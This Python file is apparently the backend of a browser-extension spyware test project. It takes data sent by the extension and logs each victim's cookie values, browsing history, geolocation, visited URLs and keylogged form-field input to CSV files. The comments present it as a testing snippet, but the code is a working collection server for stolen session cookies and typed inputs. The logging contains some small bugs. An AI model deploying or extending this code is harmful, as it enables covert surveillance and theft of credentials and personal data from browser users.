import pandas as pd
import json

"""
Global Variables
__file__ is a python variable that stores the global path to the .py file, therefore, 
it can be used instead of os for the global path, and then modify it for each path.
"""
#DataBase Path
a = __file__
a = a[:-6]+"logs\\"


"""
Non_Database_Logging

All this section is just used by "/Extension".
It logs the information in separete .csv managed by pandas
It is not a real deployment, but make it easier for testing purposes of "/Extension" a littel snipet of sniffer code
First all paths are initialized, the main function restart the files.
And Log() redirect the data send by the extension to app.py and then to here to the correct
subfunction that use pandas for storing information
"""
#Files managed by pandas that stores data, used by "/Extension"
Geo_file = a + "geo.csv" 
Cks_file = a + "cookies.csv"
His_file = a + "historial.csv"
url_file = a + "URL.csv"
FD_file  = a + "Form_Data.txt"
KLg_file = a + "keylogger_inputs.csv"
#for comodity in coding, all paths where store in the files, and the str passed by app.py
#are transformed to the rigth number in a dictionary
Files = [Geo_file,Cks_file,His_file,url_file,FD_file,KLg_file]
DFiles = {"Geo": 0, "Coo": 1, "His": 2, "Url": 3, "Form": 4, "Key": 5}

def main():
    #Create the files using the paths (Used only by "/Extension")
    for i in Files:

        f = open(i, "w")
        f.close()
    #Give the format to those files for storing the json received, used only by "/Extension"
    df = pd.DataFrame(columns=["domain","sameSite","secure","value"])
    df.to_csv(Cks_file, index=False)
    df = pd.DataFrame(columns=["lat","lon"])
    df.to_csv(Geo_file, index=False)
    df = pd.DataFrame(columns=["id","lastVisitTime","title","typedCount","url","visitCount"])
    df.to_csv(His_file, index=False)
    df = pd.DataFrame(columns=["url"])
    df.to_csv(url_file, index=False)
    df = pd.DataFrame(columns=["url","fieldname","fieldvalue"])
    df.to_csv(KLg_file, index=False)


def CookiesLog(raws):
    
    """
    An Extension can obtain all the data about cookies, but the most interesting attributes are the domain,
    sameSite (if they exists outside one page), secure (if they are limited to HTTPS) and value (the unique information that they store)
    """

    f = open(Cks_file, "r+") #open the cookie csv
    lines = f.readlines()
    if len(lines) > 600: #pandas have problems managing high density csv, this produces that the last entry introduced in the last iteration is bugged, therefore, for avoiding problems, is eliminated
        #A real deployment would use a database, not a file, therefore this problem would not appear
        lines.pop()
        f = open(Cks_file, "w+")
        f.writelines(lines)
    f.close()

    raws = json.loads(raws.decode("utf-8")) 
    df = pd.read_csv(Cks_file)
    #Opens the file, move the data from the json to a order list and add the data to the dataframe
    for raw in raws:
        data = []
        data.append(raw["domain"])
        data.append(raw["sameSite"])
        data.append(raw["secure"])
        data.append(raw["value"])
        data = pd.DataFrame([data], columns=["domain","sameSite","secure","value"])
        df = df.append(data, ignore_index=True)
    df.to_csv(Cks_file, index=False) #store dataframe


def HistLog(raws):
    """
    An extension can obtain the browser history of the user and all relationed attributes, that is, the id, the last time visited,
    the title of the web, the typed count, the url of the web and the visited count.
    All important information about the tendency and likes of the user
    """
    raws = json.loads(raws.decode("utf-8"))
    df = pd.read_csv(His_file) #Opens dataframe, put the information to an ordered list, insert it in the dataframe
    for raw in raws:
        data = list(raw.values())
        data = pd.DataFrame([data], columns=["id","lastVisitTime","title","typedCount","url","visitCount"])
        df = df.append(data, ignore_index=True)
    
    df.to_csv(His_file, index=False)#store dataframe

def GeoLog(raw):
    """
    An extension can obtain the geolocation of the user, that is the latitude, longitud and accuracy of the measure. The accuracy is not recorded here
    """
    raws = json.loads(raw.decode("utf-8"))
    df = pd.read_csv(Geo_file)#Opens dataframe, put the information to an ordered list, insert it in the dataframe
    data = []
    data.append(raws["lat"])
    data.append(raws["lon"])
    data = pd.DataFrame([data], columns=["lat","lon"])
    df = df.append(data, ignore_index=True)  
    df.to_csv(Geo_file, index=False)    #store dataframe
    pass

def UrlLog(raw):
    """
    An extension can obtain the URL of any website the user visit. This is the same that obtaining the URL but with a differente permission
    """
    raw = json.loads(raw.decode("utf-8"))
    df = pd.read_csv(url_file)#Opens dataframe, put the information to an ordered list, insert it in the dataframe
    data = list(raw.values())
    data = pd.DataFrame([data], columns=["url"])
    df = df.append(data, ignore_index=True)  
    df.to_csv(url_file, index=False)    #store dataframe
    pass

def KeyLog(raw):
    """
    An extension can setup a listener for keypresses and store them, therefore creating a functional keylogger
    """
    raw = json.loads(raw.decode("utf-8"))
    df = pd.read_csv(KLg_file)#Opens dataframe, put the information to an ordered list, insert it in the dataframe
    data = list(raw.values())
    data = pd.DataFrame([data], columns=["url","fieldname","fieldvalue"])
    df = df.append(data, ignore_index=True)  
    df.to_csv(KLg_file, index=False)    #store dataframe
    pass

def log(file, data):
    """
    When a log is requested the first parameter is a str that indicates the type of information,
    this str is translated to a int by the Dictionary and later to the path by the list
    Then the correct function is executed
    WIP: FORM DATA
    """
    file = DFiles[file]
    file = Files[file]
    if file == Cks_file:
        CookiesLog(data)
    if file == Geo_file:
        GeoLog(data)
    if file == His_file:
        HistLog(data)
    if file == url_file:
        UrlLog(data)
    if file == KLg_file:
        KeyLog(data)
    else: 
        f = open(file, "a")
        f.write(data.decode("utf-8")+"\n")
        f.close
    pass

